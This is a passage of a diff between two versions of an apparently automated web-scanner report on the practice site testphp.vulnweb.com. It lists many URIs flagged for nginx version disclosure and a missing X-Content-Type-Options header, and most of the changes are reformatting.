+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+%20'
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&size=160
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&size=160
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg&size=160
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg&size=160
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg&size=160
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/6.jpg&size=160
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg&size=160
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/signup.php
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/sitemap.xml
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/style.css
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/userinfo.php
-    Method: GET
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: GET
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/cart.php
-    Method: POST
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: POST
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: POST
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: POST
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/search.php?test=query
-    Method: POST
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: POST
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/secured/newuser.php
-    Method: POST
-    Evidence: nginx/1.19.0
-    Other Info: 
+
+  Method: POST
+  Evidence: nginx/1.19.0
 
   URI: http://testphp.vulnweb.com/userinfo.php
-    Method: POST
-    Evidence: nginx/1.19.0
-    Other Info: 
 
-  Alert: X-Content-Type-Options Header Missing, Risk: Low (Medium)
-  Description: <p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p>
+  Method: POST
+  Evidence: nginx/1.19.0
 
+Alert: X-Content-Type-Options Header Missing, Risk: Low (Medium), Confidence: 2
+Description: <p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.</p>
 Instances:
 
   URI: http://testphp.vulnweb.com/
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/AJAX/index.php
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/AJAX/styles.css
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/artists.php
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/artists.php?artist=1
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/artists.php?artist=2
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/artists.php?artist=3
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/cart.php
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/categories.php
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/disclaimer.php
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Flash/add.swf
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/guestbook.php
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/hpp/
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/hpp/?pp=12
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/images/logo.gif
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/images/remark.gif
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/index.php
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=1
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=2
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/listproducts.php?artist=3
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=1
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=2
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=3
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/listproducts.php?cat=4
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/login.php
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/1.jpg
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/2.jpg
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/images/3.jpg
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-2.html
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-3.html
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/product.php?pic=1
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/product.php?pic=2
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/product.php?pic=3
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/product.php?pic=4
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/product.php?pic=5
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/product.php?pic=6
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/product.php?pic=7
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/secured/style.css
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file='%20+%20pict.item(0).firstChild.nodeValue%20+%20'
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg&size=160
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg&size=160
-    Method: GET
-    Evidence: 
-    Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
+
+  Method: GET
+  Other Info: This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
 At "High" threshold this scan rule will not alert on client or server error responses.
 
   URI: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg
-    Method: GET
-    Evidence: 
